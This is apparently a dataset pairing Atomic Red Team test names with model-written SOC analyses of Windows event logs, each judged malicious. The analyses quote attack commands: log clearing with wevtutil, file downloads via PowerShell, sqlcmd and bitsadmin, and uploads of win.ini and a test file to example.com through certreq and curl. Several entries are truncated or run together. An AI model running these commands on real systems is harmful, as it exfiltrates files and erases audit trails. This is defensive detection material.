Download a file with IMEWDBLD.exe,"Upon reviewing the provided Windows event logs, several key indicators suggest potentially malicious activity. Here is a detailed analysis:

1. **Log File Clearing**:
   - **System & Security Logs Cleared (Event ID 104 & 1102)**: The events indicate that the system, security, and Windows PowerShell logs were cleared by a user named `admin_test` at the exact same timestamps (11:45:13). Clearing event logs is a well-known tactic used by malicious actors to hide their tracks after executing illicit activities.

2. **PowerShell Activity**:
   - **Execution of Suspicious Command**: PowerShell logs reveal a command execution of `imewdbled` with a URL linked to `atomic-red-team`, a known adversary simulation library. This is highly indicative of a test or simulation of known attack techniques, potentially aligning with TTPs (Tactics, Techniques, and Procedures) of adversaries.

3. **Use of High-Integrity Processes**:
   - The `wevtutil.exe` command used to clear logs is executed with `High` integrity level, suggesting a user with elevated privileges executed these commands.

4. **Privilege Escalation**:
   - The security log contains Event IDs 4624 and 4672 for user `admin_test`, indicating a successful logon and the assignment of several high privileges, such as `SeDebugPrivilege` and `SeTcbPrivilege`, which can be used in privilege escalation attacks.

5. **Frequent Process Executions**:
   - Numerous system utilities (`whoami`, `hostname`, `dllhost.exe`, etc.) were executed in quick succession, which could indicate enumeration or other recon activities usually performed during initial stages of a compromise.

6. **Network Connection Indication**:
   - The PowerShell command attempted a connection to a remote URL, hinting at potential data exfiltration or download of additional malicious components.

Considering these observations, the logs collectively suggest malicious intent rather than benign activity. The clearing of logs, execution of potential attack simulations, and suspicious command-line activities are classic indicators of active malicious endeavors.

**Resolution: MALICIOUS**
- **Immediate Steps**:
  - Conduct a full forensic analysis to uncover the extent of the compromise.
  - Isolate the affected system to prevent further unauthorized activities.
  - Review user account access rights and apply the principle of least privilege.
  - Reset passwords for `admin_test` and associated accounts, and enforce stronger authentication measures.
  - Examine other systems within the network for similar activity patterns.
  - Patch any vulnerabilities that may have been exploited and review firewall and network security configurations."
iwr or Invoke Web-Request download,"### Detailed Analysis of Windows Event Logs

Upon reviewing the provided log entries, several key points of interest stand out that may indicate malicious activity:

1. **Clearing Event Logs:**
   - **System Log (EventID 104)**: Multiple instances where the logs were cleared (System and Windows PowerShell channels) by the user 'admin_test'. The clearing of event logs, especially by a non-routine administrative user, is considered suspicious because attackers often clear logs to cover their tracks.
   - **Security Log (EventID 1102)**: Clearing the Security logs by the same user is particularly suspect as security logs hold crucial information about user actions and authentication attempts.

2. **Process Execution with Powershell:**
   - **Sysmon Log (EventID 1)**: There is a suspicious Powershell command. The command `powershell.exe iwr -URI https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -Outfile %temp%\Atomic-license.txt` was executed, indicating usage of 'Invoke-WebRequest' to download a file from the internet. This behavior is unusual unless sanctioned by an administrator for specific scripting purposes and can indicate script-based attacks, especially when tools like Red Canary's Atomic Red Team are involved, as these are known for adversary simulation testing.

3. **Time Manipulation:**
   - **Security Logs (EventID 4616)**: Events indicate a potential time anomaly where the system time was adjusted backward. Time manipulation can be used by attackers to mess with the timestamps logged in event logs before clearing them to hinder forensic analysis.

4. **Excessive Usage of Eventing Command Line Utility (wevtutil):**
   - **Sysmon Log (EventID 1)**: The presence of multiple 'wevtutil' executions to clear logs across various channels (System, Security, Application, and Windows PowerShell) by the user 'admin_test' denotes repeated attempts to potentially erase traces of activity.

5. **Integration or Execution of Various System Utilities:**
   - Processes like `hostname.exe` and `whoami.exe` were run, which could align with tactics used during post-exploitation or reconnaissance stages.

### Assessment

Based on the combination of activities, namely:
- Frequent and unexplained clearing of logs.
- Suspicious command execution via PowerShell.
- System time alteration.
- Usage of administrative utilities in a potentially adversarial context.

These activities align strongly with techniques used during advanced persistent threat operations or penetration testing engagements.

### Resolution: MALICIOUS

Given the collected indicators, these logs point towards a likely malicious activity trace. This situation demands immediate attention and comprehensive investigation to confirm compromise and initiate remediation steps.

### Guidance on How to Proceed
- **Incident Response Activation**: Initiate the incident response protocol to triage, contain, and conduct a full forensic investigation.
- **Preserve Evidence**: Ensure that full forensic copies of relevant systems are made for further analysis.
- **Access Review**: Review permissions and access control for the user 'admin_test' and all logs within the security infrastructure.
- **Patch and Monitor**: Patch vulnerable systems, especially if exploits were involved, and configure robust monitoring to detect similar activities immediately in the future.
- **Report and Communicate**: Document findings thoroughly and communicate them with the incident response team, management, and if applicable, authorities.

Immediate professional forensic analysis and threat intelligence inputs should be sought to better understand the full scope and establish a recovery plan."
Lolbas replace.exe use to copy UNC file,"**Analysis of Logs**

1. **Log Clearing Activity**: The logs reveal multiple entries indicating that the `wevtutil.exe` utility was used to clear log channels, including Security, System, and Windows PowerShell logs. These actions were performed by a user identified as `admin_test`. Log clearing, especially of security-related logs, is a significant indicator of potential malicious activity as it may suggest an attempt to cover tracks.

   - **Security Log**: Event ID 1102 is logged when the audit log is cleared.
   - **System Log**: Event ID 104 indicates that the log was cleared.

2. **Process Execution Patterns**:
   - **Usage of `wevtutil.exe`**: The Sysmon logs exhibit multiple executions of `wevtutil.exe` with the `cl` (clear) command to clear various event logs, executed by the user `admin_test`. This is highly suspicious as clearing logs is not a typical operation for regular administration under normal circumstances.
   - **Command Usage**: The Sysmon log also shows the execution of:
     - `cmd.exe` with command line arguments involving deletion of files and execution of `replace.exe`. The execution of replace.exe involves copying over network shares which matches techniques often related to lateral movement or staging within a compromised environment.

3. **Adminsitrative User Involved**:
   - The activities observed were performed by `admin_test`, hinting possible misuse of administrative credentials or compromise of the `admin_test` account.

4. **Scheduled/Automated Tasks**:
   - Microsoft Edge Update related activities are observed frequently. These activities, related to edge update services and executables, appear to be benign and scheduled based on the version updates seen in the logs.

5. **Tactics, Techniques, and Procedures (TTPs)**:
   - The use of native tools (wevtutil, cmd) and log clearing fits a pattern often associated with attackers attempting to evade detection post-exploitation.

**Assessment and Recommendation**

**Resolution**: **MALICIOUS**

The use of `wevtutil.exe` to clear event logs combined with the other observed process executions, particularly around file manipulation with cmd.exe and usage of `replace.exe`, strongly indicates malicious activity. The focus on log deletion is particularly notable as a tactic employed by attackers to suppress indicators of their activity within the system.

**Guidance on How to Proceed**:

File Download with Sqlcmd.exe,"Upon reviewing the provided logs, several suspicious activities have been identified that indicate potential malicious activity on the system. Here's the detailed analysis:

1. **Event Log Clearing**:
   - The entries from the Security (Event ID 1102), System (Event ID 104), and PowerShell logs indicate that the event logs have been cleared. Specifically, `wevtutil.exe` was executed multiple times to clear the Security, System, and PowerShell logs by the user `admin_test`. This is often a tactic employed by malicious actors to cover their tracks post-exploitation or post-action.

2. **Suspicious PowerShell Activity**:
   - Multiple entries in the Windows PowerShell log show that a PowerShell command was run to download a file from a GitHub URL using `sqlcmd`. The command is as follows: `powershell.exe & {sqlcmd -i https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.zip -o C:\T1105.zip}`. This type of activity matches known penetration testing or exploitation frameworks and is possibly an attempt to download a tool from the Atomic Red Team repository, which simulates adversary behavior.

3. **Sysmon Entries**:
   - There are multiple Sysmon entries capturing the execution of `powershell.exe`, `wevtutil.exe`, `whoami.exe`, and `hostname.exe` by the `admin_test` user, which possibly supports reconnaissance and log clearing activities.
   - A Sysmon entry captures the `setup.exe` process of Microsoft Edge Installer being run. While this could be benign, it’s worth noting that this was found alongside other suspicious activities, so it supports the likelihood of tampering or additional exploitation activities.

Based on the combined analysis of the events, especially the log clearing activities and the execution of a PowerShell command to download possibly malicious tools, the indicators point towards deliberate and potentially harmful actions taken on the system. The clearing of logs typically indicates an attempt to hide unauthorized or malicious activity.

AnyDesk Files Detected Test on Windows,"Upon analyzing the provided logs, there are several indicators of potentially malicious activity:

1. **Windows Event Log Clearing**:
   - The Sysmon and Security logs indicate multiple instances of the `wevtutil.exe` process clearing various logs including the Security, System, and Application logs. The clearing of event logs is a common technique used by attackers to cover their tracks.

2. **Suspicious PowerShell Activity**:
   - The PowerShell logs show the execution of a command that downloads and runs `AnyDesk.exe` from an external URL (https://download.anydesk.com). This activity is unusual, as downloading and executing software directly via PowerShell can be a method used in malware distribution or unauthorized remote access setup.

3. **AnyDesk Execution**:
   - The Sysmon logs demonstrate that `AnyDesk.exe` was executed shortly after being downloaded. The process was executed with the `/S` (silent) command-line switch and later executed multiple times with different command-line switches like `--local-service` and `--local-control`. This behavior is consistent with establishing remote control or access.

4. **User Involvement**:
   - Activities were executed under the user `""SERVER002\\admin_test""`, which might have needed privileges for such actions, indicating potential user account compromise or misuse by an insider.

5. **No Obvious Legitimate Justification**:
   - There appear to be no legitimate business or operational reasons for these actions, especially with respect to the use of PowerShell for downloading executable files and clearing of logs.

**Conclusion**: The activities observed in the logs are indicative of a potential compromise involving remote control setup through AnyDesk, log clearing to cover tracks, and the use of PowerShell for downloading and executing files. These are strong indicators of malicious activity.

**Resolution**: **MALICIOUS** 

**Guidance**:
1. Immediately commence incident response procedures.
2. Isolate the affected host to prevent further unauthorized access.
3. Conduct a thorough forensic analysis to determine the full scope of the compromise.
4. Change all compromised or potentially compromised credentials immediately.
5. Review and enhance firewall rules and endpoint detection systems to block similar future activities.
6. Educate users on avoiding similar threats through social engineering or phishing."
GoToAssist Files Detected Test on Windows,"### Analysis of the Provided Windows Event Logs

Upon analyzing the given logs, there are several key observations that point towards suspicious and potentially malicious activity:

1. **Clearing of Event Logs**:
   - **System Logs Cleared**: The events show that the System and Windows PowerShell event logs have been cleared by a user `admin_test` (EventID 104 from Microsoft-Windows-Eventlog and EventID 1102 from the Security log). This action is often associated with an attempt to cover up traces of malicious activity.

2. **Office Sign In**:
   - **Unusual Processes and Execution**:
     - Several executions of `wevtutil.exe` have been used to clear event logs (`cl Application`, `cl System`, `cl Security`, `cl ""Windows PowerShell""`), which aligns with the clearing of event logs discussed earlier. The use of `wevtutil.exe` in this manner is a strong indicator of malicious behavior aiming to hide tracks.
   
3. **Suspicious PowerShell Activity**:
   - There is an execution of PowerShell with the command `Invoke-WebRequest` to download `GoToAssist.exe` from a remote source and execute it silently (noted in Sysmon log EventRecordID 17980 and associated PowerShell logs). This kind of activity is typically used in malware campaigns for downloading and executing payloads without user knowledge.

4. **Installation and Execution of Software**:
   - Legitimate-looking installations of `GoTo` software (e.g., GoTo Opener, GoToAssist) are present. While these could be legitimate, their association with the cleared logs and remote download might indicate misuse for unauthorized remote access or control.

5. **Logon Activity**:
   - There are multiple logon events with elevated privileges (`EventID 4672 - Special privileges assigned to new logon`), which could suggest privilege escalation, although this can also occur in legitimate scenarios.
   
6. **Overall Context**:
   - The combination of log clearing, remote script execution, software installation from an external server, and the privilege escalation strongly indicates an incident where typical signs of compromise are present.

### Assessment and Recommendations

Testing usage of uncommonly used port with PowerShell,"Upon reviewing the provided Windows event logs, I've noted several key points of interest that could potentially indicate malicious activity:

1. **Log Cleared Events**: 
   - We see multiple `wevtutil.exe` executions which are used to clear event logs (`Event ID 104` and `Event ID 1102`). This is a common tactic used by attackers to cover their tracks and hinder forensic analysis. Specifically, Event ID 1102 from the Security log indicates that the security log was cleared by the user `admin_test` on `Server002`.
   
2. **High Privilege Process Execution**:
   - Events like `4624` and `4672` in the Security log show the creation of logon sessions with elevated privileges (e.g., `SeAssignPrimaryTokenPrivilege, SeTcbPrivilege, SeSecurityPrivilege, etc.`). The `admin_test` user seems to be using processes that conduct elevated privilege actions.

3. **Using Sysmon Events**:
   - The presence of process creations involving tools like `wevtutil.exe`, `hostname.exe`, and `whoami.exe` (via Sysmon Event IDs like 1 and 5) suggests reconnaissance activities. These tools are typically used in learning about the environment, system configuration, and potentially installed software or system details.

4. **Unusual PowerShell Activity**:
   - The PowerShell log showing the execution of a command using `Test-NetConnection` to connect to an external resource (google.com) on a non-standard port (8081). While not inherently malicious, atypical network activity should be validated, especially in a secure environment. 

5. **Repeated Credential Access Failures**:
   - Event IDs 5379 in the Security log show failures to access certain accounts, possibly indicating attempted unauthorized access or a misconfigured service process.

6. **Task Host Activity**:
   - Notable activity of `taskhostw.exe` shows it being used for persistent enumeration of accounts (Event ID 4798). This could be indicative of account enumeration, possibly for privilege escalation or information gathering.

### Assessment
The logs exhibit multiple indicators of potentially malicious activity. The clearing of logs, the use of reconnaissance tools, and the execution of elevated privilege processes align with what we might expect during a compromise or an attack in progress.

### Resolution
- **MALICIOUS**: The series of events capture activity patterns that are strongly indicative of malicious behavior. Immediate action is warranted to contain and address a likely security incident.

### Guidance
1. **Conduct Incident Response**: Initiate an immediate incident response process to understand the extent of the compromise, identifying affected systems and isolating them.

2. **Review User Access and Privileges**: Check `admin_test` and any associated accounts for unauthorized privilege assignments or suspicious activity.

3. **Secure Logs and Backups**: Ensure back-up logs and records that might provide full insight into activities pre-log-clearance actions.

4. **Network Monitoring**: Increase monitoring of network activities, specifically for unusual remote connections or data exfiltration attempts.

5. **Assess and Correct Security Gaps**: Evaluate the security posture of the affected systems and implement robust monitoring, detection, and incident management practices to prevent future occurrences.

UltraVNC Execution,"Based on the logs provided, there are several indicators that suggest potential malicious activity on the Windows host (Server002):

### Indicators of Potential Malicious Activity:

1. **Event Log Clearing:**
   - Several logs indicate that the event logs were cleared (`EventID: 104` in the System log and `EventID: 1102` in the Security log) by the user `admin_test`. Clearing event logs is a suspicious activity often associated with malicious actors attempting to cover their tracks.

2. **Execution of Suspicious Processes:**
   - The execution of `setpasswd.exe` and `setcad.exe` located in `C:\Program Files\uvnc bvba\UltraVNC\` and initiated by `vncsetup.tmp` suggest the installation or configuration of remote access software. This could be legitimate but also a method for unauthorized access.

3. **Firewall Modification:**
   - Multiple entries of `netsh.exe` being used to add firewall rules (`firewall add portopening TCP 5900 vnc5900` and `firewall add portopening TCP 5800 vnc5800`) are indicative of potentially unauthorized network configurations. These ports are typically used by VNC software for remote desktop sessions.

4. **Process Launch via PowerShell:**
   - PowerShell is used to start processes (`wevtutil.exe` and `vncviewer.exe`) which may indicate attempts to manipulate system logs and connect remotely via VNC respectively. This is a common technique used in post-exploitation activities.

5. **Remote Access Tool:**
   - The presence of activities related to UltraVNC, including setting passwords and enabling remote access through firewall rules, suggests potential use of this tool for remote access. While UltraVNC is legitimate software, its use in conjunction with other observed behaviors raises red flags.

### Assessment:

- The combination of event log clearing, firewall rule modifications, and the installation/operation of remote access tools indicates an attempt to maintain stealthy and persistent access to the system. These activities align with typical post-compromise tactics used by attackers to maintain control over an affected machine.

### Resolution:

- **MALICIOUS**: The logs show clear indicators of malicious activity, likely involving the use of remote access tools to persist access and the clearing of event logs to hide these activities.

### Guidance:

- Immediately isolate Server002 from the network to prevent further potential unauthorized access or data exfiltration.
- Conduct a thorough investigation to determine the full scope of any compromise, ensuring all affected systems are identified.
- Review and enhance security policies to detect and respond to similar activities in the future, including monitoring for PowerShell and netsh executions.
- Consider resetting credentials for user `admin_test` and any other potentially compromised accounts.
- If UltraVNC is not part of standard operations, ensure its removal and assess the need for any remote access tools."
Psiphon,"Upon analyzing the provided Windows event logs, the following observations and analysis have been made:

1. **Clearing of Event Logs**:
   - The logs indicate that the event logs for the System and Windows PowerShell channels were cleared by the user `admin_test`. This is recorded in both the System and Security event logs with Event ID 104 in the System logs and Event ID 1102 in the Security logs.
   - Clearing log events is an unusual and suspicious activity often undertaken to hide malicious actions, potentially as part of an anti-forensic maneuver to erase traces of other actions.

2. **Suspicious PowerShell Execution**:
   - There is a record of PowerShell execution (Sysmon Event ID 1) with a command line referencing a file `Psiphon.bat` located in a temporary directory associated with Atomic Red Team. The presence of such batch files and execution from temporary directories can be indicative of suspicious activities, often used for executing or testing capabilities associated with intrusion.

3. **Running of System Utilities**:
   - Multiple instances of `wevtutil.exe` (which is used for managing Windows event logs) being executed around the same time the logs were cleared, suggest an attempt to programmatically clear logs (Sysmon log entries).
   - Usage of `wevtutil.exe` to clear logs programmatically is another indicator of potential malicious actions to cover other nefarious activities.

4. **Logon and Privilege Escalations**:
   - The logs reflect several successful logon events for SYSTEM processes, with potentially elevated privileges as indicated by the presence of Event ID 4672 for SeDebugPrivilege and other high-level privileges.
   - While this might be part of usual operations for some services, combined with the log-clearing activities, it raises a flag for potential privilege abuse.

5. **General Observations of Services**:
   - There were multiple services executed, many with svchost.exe, which acts as a host process for Windows services. While svchost.exe is a legitimate system process, it should be monitored for any unusual or unauthorized usage, especially when analyzing suspicious activities.

### Final Assessment and Resolution:

- **Resolution: MALICIOUS**

Based on the evidence of clearing event logs, suspicious execution of PowerShell with a script from a temporary directory, and the use of `wevtutil.exe` likely for log manipulation, the activities reflected in the logs are highly indicative of malicious actions. There appears to be a concerted effort to hide command execution and process activity by clearing logs, which aligns with typical patterns of adversarial behavior.

### Guidance on How to Proceed:
- Conduct a thorough investigation into the activities of the user `admin_test` and the source of the `Psiphon.bat` script.
- Inspect other logs and system artifacts for additional indications of compromise or lateral movement.
- Conduct a full security audit of the system, focusing on user activities, logon events, and unusual system utility usage.
- Remediate any unauthorized changes and strengthen security measures to prevent unauthorized access and malicious actions in the future."
svchost writing a file to a UNC path,"Based on the analysis of the provided logs, the following findings and assessments were made:

1. **Usage of `wevtutil.exe`:** 
   - Multiple events show the use of `wevtutil.exe` to clear different event logs such as Sysmon, Application, and Security logs. The command used is `""C:\\Windows\\system32\\wevtutil.exe"" cl <LogName>` where `<LogName>` is the name of the event log being cleared. Clearing event logs is often a technique used by malicious actors to cover their tracks and avoid detection.

2. **Clearing of Event Logs:**
   - Event ID 104 in the System log indicates that the event logs were cleared by the user `admin_test`. This is confirmed by the Sysmon logs showing `wevtutil.exe` executions and corresponding Event ID 1102 in the Security logs indicating the Security log was also cleared.

3. **Execution of Suspicious Commands:**
   - A `cmd.exe` process was executed with a command line that copies `cmd.exe` to `svchost.exe` and then uses the copied executable to create a text file indicating the T1105 attack technique (`echo T1105`), which is associated with data transfer tools. This behavior is highly suspicious and indicative of malicious activity.

4. **Antivirus Evasion:**
   - By renaming `cmd.exe` to `svchost.exe`, the process attempts to evade detection, as `svchost.exe` is a legitimate and commonly occurring Windows process.

5. **Privilege Escalation Indicators:**
   - User `admin_test` appears to have been granted high privileges, evidenced by integrity levels and the list of privileges in Event ID 4672 from the Security log (including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.), suggesting an account may have been compromised or maliciously configured.

6. **Time Changes:**
   - There is evidence of time manipulation on the system, indicated by Event ID 4616 in the Security log. Adjusting system time is another tactic used to confuse event tracking and logs.

Given these observations, the activity noted in the event logs shows clear signs of malicious intent, specifically, log clearing, suspicious process execution, and a potential elevation of privileges. 

**Resolution: MALICIOUS**

**Guidance:**
- Immediate actions should include isolating the host (Server002) to prevent further malicious activity.
- Initiate a comprehensive investigation to identify how the 'admin_test' account was compromised or used to perform these activities.
- Revise existing access control measures, ensuring least privilege principles are properly enforced.
- Review all other systems for similar activities or signs of compromise.
- Take preventive measures by updating security policies and applying patches or security updates where necessary.
- Conduct a full malware and system integrity scan.
- Consider reporting the incident for further security assessment and follow standard incident response protocols."
Download a File with Windows Defender MpCmdRun.exe,"Upon thorough examination of the logs provided, several entries emerge as significant and warrant closer scrutiny for suspicious or malicious activities:

### Analysis and Observations:

1. **Event Log Clearance:**
   - **System Log Entry 3566, 3567**: The event logs for the ""System"" and ""Windows PowerShell"" channels were cleared by the user `admin_test`. This is recorded as Event ID 104 from the `Microsoft-Windows-Eventlog` provider. The clearance of event logs, especially system and critical logs like PowerShell, without a clear, legitimate reason, is highly suspicious. It's often indicative of malicious activity, as perpetrators frequently clear logs to cover their tracks post-intrusion or after executing unauthorized activities.

2. **Security Logs Cleared:**
   - **Security Log Entry 30348**: The security logs were cleared by the same user, `admin_test`. This event, recorded as Event ID 1102, further intensifies the suspicion as it is a direct attempt to erase evidence from the system.

3. **Command Line and Process Activities:**
   - **Sysmon Entry 17960, 17972, 17980**: These involve processes such as `wevtutil.exe` being executed to clear specific logs (`cl System`, `cl Windows PowerShell`). The `wevtutil.exe` is a command-line utility with legitimate uses but is also commonly used by threat actors during forensic countermeasure activities.
   - **The command line usage of `cmd.exe` in Sysmon Entry 17950**: ""cmd.exe /c cd ... MpCmdRun.exe /?"" – Usage of command-line arguments manipulating folder paths and executing security utilities could be suspicious if not originating from known administrative scripts or personnel, especially given the same user cleared logs.

4. **Time Anomalies:**
   - **System Entry 3568, 3569**: There are events indicating system time changes using `svchost.exe`. While these actions might be innocuous when related to legitimate time-sync processes, they could be used maliciously to alter time records as part of covering tracks.

5. **Regular System Activities:**
   - Different system maintenance and update processes related to `MicrosoftEdgeUpdate.exe` and `SecurityHealthService.exe` appear active, which generally sound routine and part of software updates or maintenance activities.

### Assessment:
Based on the evidence from the logs, particularly the log clearing events, the execution of event-clearing commands, and the suspicious command-line executions not typical for regular user activity, it is strongly suggested that these entries indicate an attempt to hide malicious activities on the system. The consistency of actions involving the clearing of logs across different channels is of particular concern.

### Conclusion:
**Resolution: MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Isolation**: Isolate the host from the network to prevent further potential spread or communication from the compromised system.
   
2. **Deep Forensic Analysis**: Conduct a comprehensive forensic investigation on the affected machine, particularly focusing on recovering cleared log data using disk forensics or existing backups.

1. **Log Clearance**:
   - Multiple entries indicate that logs have been cleared:
     - Security Log (EventID 1102) at `2024-10-24 12:13:25.3612503` by user `admin_test`.
     - System Log clearance (EventID 104) at `2024-10-24 12:13:25.2792637` by user `admin_test`.
     - Windows PowerShell Log clearance (EventID 104) at `2024-10-24 12:13:25.4427868` by user `admin_test`.
   - Cleared logs, particularly without a backup path and in quick succession, are generally a strong indication that a user might be attempting to remove traces of their actions, which could be indicative of malicious activity.

2. **Suspicious Process Execution**:
   - Multiple executions of `wevtutil.exe cl` targeting different logs (Sysmon, Application, System, Windows PowerShell) by `admin_test`, suggesting deliberate log manipulation.
   - An execution pattern of `cmd.exe` launching `certreq.exe` with a potentially suspicious command-line argument: `""certreq.exe -Post -config https://example.com c:\\windows\\win.ini""`, which may indicate data exfiltration attempts or unauthorized requests.

3. **Elevated Privileges**:
   - There are privilege escalation indicators such as EventID 4672 where user `admin_test` is granted a wide range of privileges, which is consistent with attempts to elevate capabilities beyond a typical user's profile.

4. **EdgeUpdate**:
   - The EdgeUpdate service has started and stopped multiple times, but these log entries alone are not definitive indicators of malicious behavior unless correlated with other suspicious activities, such as the log clearances mentioned.

**Assessment**:
- The logs present evidence of potentially malicious behavior: the repeated clearing of event logs, an unusual command execution potentially indicative of unauthorized activities, and privilege escalations are all red flags in security monitoring.

**Resolution**:
- **MALICIOUS**: The combination of log clearing, elevated privileges, and suspicious command executions in the logs leads to the conclusion that these logs reflect malicious activity efforts.

**Guidance on How to Proceed**:
1. **Immediate Actions**:
   - Isolate the affected system to prevent any potential spreading of malicious activities or further tampering.
   - Conduct a thorough malware scan and integrity check to identify any additional unauthorized modifications or malware presence.
   - Begin a deeper forensic analysis to understand the extent of activities performed by `admin_test`.

2. **User Account and Access Review**:
   - Temporarily suspend the `admin_test` account and review all activities associated with this user.
   - Assess potential vulnerabilities or security misconfigurations that were leveraged for privileges elevation.

3. **Log and Monitoring Enhancement**:
   - Implement stricter logging and monitoring controls.
   - Regularly back up logs to a secure location to prevent tampering.

4. **Incident Response and Recovery**:
   - Follow incident response protocols to support the recovery of the system and safeguard data integrity.
   - Educate and train users on best security practices to avoid similar occurrences in the future. 

By addressing these concerns, you can mitigate risks and strengthen the security posture of the network environment."
Windows - BITSAdmin BITS Download,"### Detailed Analysis of the Windows Event Logs

**1. Log Clearing Events:**
- **Security Log and System Log Events:**
  - **EventID 1102 and 104** indicate that the security and system event logs were cleared. 
  - This action was performed by the user `SERVER002\admin_test`. 
  - Log clearing is unusual unless performed by an administrator for specific maintenance tasks and is often indicative of an attempt to cover tracks after unauthorized changes.

**2. Time Change Events:**
- **EventID 4616** shows that the system time was changed, which can be a legitimate activity if done with proper authorization. However, frequent and unauthorized time changes might indicate attempts to manipulate log timelines.

**3. Command-Line Utility Usage:**
- **wevtutil.exe** (used for clearing logs) execution is recorded multiple times:
  - The command-line tool is specifically used to clear event logs like `Microsoft-Windows-Sysmon/Operational`, `Application`, `Security`, and `Windows PowerShell`.
  - The process was executed by `SERVER002\admin_test`, which matches the user involved in the log clearing events.

**4. Execution of Suspicious Commands:**
- **EventID 17977** shows the execution of `cmd.exe` with the `bitsadmin.exe` utility to download a file from an external source (Github):
  - The file `LICENSE.txt` from a URL was downloaded to a temporary directory using `BITSAdmin`, a known living-off-the-land binary sometimes used for malicious purposes due to its capability to download and upload files without any additional tool.
  - The execution of this command indicates a possible attempt to leverage BITSAdmin for data download or command execution, which needs further investigation.

**5. Process Execution Patterns:**
- The patterns of `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and `hostname.exe` executions in proximity suggest an investigation by the user about their environment details, possibly from a malicious perspective to gather information about user privileges and hostnames.
- **svchost.exe** and **sppsvc.exe** seem to operate under system accounts, which is normal but should be investigated if acting outside their typical behavior.

**Assessment and Recommendations:**
- **Indicators of Potential Compromise:**
  - Clearing of event logs is a serious red flag, usually associated with evasion techniques.
  - The unauthorized usage of a system command to modify time might indicate log tampering.
  - The potential misuse of `BITSAdmin` to transfer files from an external source needs immediate attention.

**Resolution: MALICIOUS**

The activities observed within these logs, especially the clearing of event logs, unauthorized script or command executions such as `BITSAdmin` download, and manipulation of system time, align with behaviors seen during post-exploitation activities. It directly suggests malicious intents aimed at reconnaissance and concealing tracks. Immediate incident response procedures should be enacted, including isolating the affected system for forensic analysis, reviewing account usage, and correlating network traffic for data exfiltration attempts."
MSP360 Connect Execution,"Upon reviewing the provided event logs from the Windows host, several key observations emerge that warrant further investigation. The logs reveal several potentially suspicious activities:

### Key Findings:

1. **Log Clearing Events:**
   - Multiple instances of the `wevtutil.exe` command being invoked to clear logs are evident throughout the logs. Specifically, logs in the System, Application, Windows PowerShell, and Security channels were cleared (event ID 104 in System and application logs, event ID 1102 in Security logs).
   - These events are performed by the user `admin_test`, which indicates deliberate action to remove evidence from the logs. 
   - The sequence of these events occurring within quick succession suggests an attempt to cover up activities, which is a common tactic in malicious operations to hinder forensic investigations.

2. **Suspicious PowerShell Execution:**
   - The `powershell.exe` process was executed with the command line `powershell.exe & {Start-Process $env:ProgramFiles\\Connect\\Connect.exe}`. While this command aims to start another process using PowerShell, it raises concerns regarding the purpose and legitimacy of `Connect.exe`.
   - The use of PowerShell to execute processes is a well-known technique used by attackers to carry out various malicious activities under the guise of legitimate operations.

3. **Process and User Anomalies:**
   - The logs show high integrity level processes (e.g., `whoami.exe`, `hostname.exe`) run by `admin_test`, indicating elevated privileges. This may indicate privilege escalation if the user wasn't supposed to have such levels of access.
   - The `wevtutil.exe` command is executed with a high integrity level to clear various event logs, and is linked to the `admin_test` user as seen multiple times in Sysmon events.
   
4. **Frequent EdgeUpdate Activities:**
   - Numerous instances of Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe` and others) are seen carrying out updates. Although this activity could be legitimate, its frequent and repetitive nature, closely timed with log-clearing and other suspicious activities, requires verification of their legitimacy.

### Assessment & Resolution:

Based on the occurrence of the aforementioned activities, particularly the systematic clearing of event logs, use of PowerShell to initiate potentially suspicious processes, and the anomalies surrounding user privileges, the situation is assessed as:

**Resolution: MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Monitoring and Isolation:**
   - Isolate the infected host from the network to prevent further potential spread of the compromise.
   
2. **User Privileges Review:**
   - Review the access levels and activities associated with the `admin_test` account. Consider resetting credentials or disabling the account.
   
3. **Forensic Analysis:**
   - Conduct a deeper forensic analysis on the host's disk and memory to identify additional malicious artifacts or evidence of compromise.
   - Investigate the full path and hash values of suspicious executables like `Connect.exe` to assess their legitimacy.

4. **Log Review and Recovery:**
   - Attempt to recover and review cleared logs if backups exist. Implement stricter monitoring for log clear events.
   
5. **Patch Management & Updates:**
   - Ensure all software, including Microsoft Edge and system protections, are up to date to reduce vulnerabilities.
   
6. **Incident Report & Notification:**
   - Generate a detailed incident report and notify relevant stakeholders to understand the potential impact and review security posture.

A thorough follow-up investigation is critical to verify if other hosts in the network have been impacted similarly. Implementing improved monitoring and logging retention policies is recommended to prevent future occurrences."
Curl Upload File,"Upon analyzing the provided Windows event logs, several indicators of potentially suspicious or malicious activity are observed:

1. **Log File Clearing**: 
   - The logs indicate the clearing of the System, Windows PowerShell, and Security logs by a user ""admin_test"" at the same timestamp (`EventID: 104 and 1102`).
   - Clearing event logs can be an indication of malicious activities as it can be used to cover tracks after potentially harmful actions have been performed.

2. **Usage of `wevtutil.exe` Command**:
   - There are multiple instances of `wevtutil.exe`, a command-line utility used for managing event logs, being executed to clear event logs. The presence of this in combination with cleared log events suggests intentional log tampering (`CommandLine`: `""C:\\Windows\\system32\\wevtutil.exe\"" cl System`, Security, and Windows PowerShell`).

3. **Suspicious Usage of `cmd.exe` and `curl.exe`**:
   - The events show the execution of `cmd.exe` running `curl.exe` to transfer a file named `atomictestfile.txt` from the local machine to an external server `www.example.com` using various HTTP methods. This behavior could indicate data exfiltration attempts.

4. **Processes Executed by `admin_test`**:
   - Processes such as PowerShell, `whoami.exe`, `hostname.exe`, and `cmd.exe` are executed by the user `admin_test` with a high integrity level, possibly pointing to privilege escalation or tunneling activities.

5. **Frequent Service Stopping**:
   - The logs contain entries about the termination of services like `edgeupdate`, which may be exploited to disrupt regular system updates or operations.

**Assessment**:
This analysis suggests possible indications of malicious activity or actions attempted to hide certain operations on the system. The main concerns include the clearing of event logs, potential data exfiltration via `curl.exe`, and commands executed with potentially elevated permissions.

**Resolution**: MALICIOUS

**Guidance**:
- Immediately conduct a deeper forensic analysis to gather further context on these activities.
- Investigate the use of user `admin_test`, reviewing any abnormal access and actions performed by this account.
- Audit system security policies and access controls to prevent unauthorized log clearance.
- Consider malware scans and monitoring for unauthorized remote connections or data transfers.
- Increase logging and alerting rules to capture unusual activities for better incident response in the future."
Splashtop Streamer Execution,"After analyzing the provided Windows event logs, the following observations and assessments have been made:

### Observations:

1. **Frequent Use of Wevtutil**:
